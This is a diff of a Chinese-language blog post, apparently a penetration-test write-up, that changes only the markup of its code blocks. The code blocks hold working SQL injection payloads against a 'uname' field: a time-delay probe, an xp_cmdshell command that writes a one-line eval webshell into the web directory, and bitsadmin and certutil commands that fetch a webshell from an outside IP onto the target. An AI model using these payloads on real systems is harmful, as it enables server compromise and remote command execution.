@@ -166,7 +166,7 @@
 <li>判断是否是站库分离(延时后返回正确页面，确定站库没有分离)</li>
 </ul>
 
-<pre><code>uname=test';if(host_name()=@@servername) WAITFOR DELAY '0:0:5';--
+<pre><code class="language-sql">uname=test';if(host_name()=@@servername) WAITFOR DELAY '0:0:5';--
 </code></pre>
 
 <ul>
@@ -253,7 +253,7 @@ D:\WEBAPP\Content\layer\
 <br>
 尝试写入一句话(&lt; &gt;的前面要加^)</p>
 
-<pre><code>uname=test';exec master..xp_cmdshell 'echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.item[&quot;Aa1234567&quot;],&quot;unsafe&quot;);%^&gt; &gt; D:\bak\20170226\webapp\Content\layer\cc.aspx';--
+<pre><code class="language-sql">uname=test';exec master..xp_cmdshell 'echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.item[&quot;Aa1234567&quot;],&quot;unsafe&quot;);%^&gt; &gt; D:\bak\20170226\webapp\Content\layer\cc.aspx';--
 </code></pre>
 
 <p>访问时可以看到aa.aspx确实写入了，但是菜刀连接不上
@@ -265,12 +265,12 @@ D:\WEBAPP\Content\layer\
 
 <p>使用bitsadmin下载时并没有成功，访问<code>http://111.*.*.59/Content/layer/aaa.aspx</code>返回404</p>
 
-<pre><code>uname=test';exec master..xp_cmdshell 'bitsadmin /rawreturn /transfer getfile http://59.108.123.123/aaa.aspx D:\bak\20170226\webapp\Content\layer\aaa.aspx';--
+<pre><code class="language-sql">uname=test';exec master..xp_cmdshell 'bitsadmin /rawreturn /transfer getfile http://59.108.123.123/aaa.aspx D:\bak\20170226\webapp\Content\layer\aaa.aspx';--
 </code></pre>
 
 <p>使用certutil下载时才成功，得到shell地址<code>http://111.*.*.59/Content/layer/aaa.aspx</code></p>
 
-<pre><code>uname=test';exec master..xp_cmdshell 'certutil -urlcache -split -f http://59.108.123.123/aaa.aspx D:\bak\20170226\webapp\Content\layer\aaa.aspx';--
+<pre><code class="language-sql">uname=test';exec master..xp_cmdshell 'certutil -urlcache -split -f http://59.108.123.123/aaa.aspx D:\bak\20170226\webapp\Content\layer\aaa.aspx';--
 </code></pre>
 
 <p><img src="/img/post/Xnip2019-03-03_20-42-24.png" alt="70" /></p>
